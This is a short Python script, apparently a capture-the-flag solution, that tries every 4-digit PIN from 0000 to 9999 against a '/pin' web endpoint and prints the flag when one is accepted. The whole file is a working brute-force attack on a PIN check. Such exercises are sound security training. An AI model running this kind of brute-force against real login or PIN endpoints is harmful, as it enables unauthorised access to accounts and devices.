import requests
import sys

ip = sys.argv[1]
port = sys.argv[2]

# Try every possible 4-digit PIN (0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    print(f"Trying PIN: {formatted_pin}")

    #Send request to server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    if response.ok and 'flag' in response.json():
        print(f"Found PIN: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break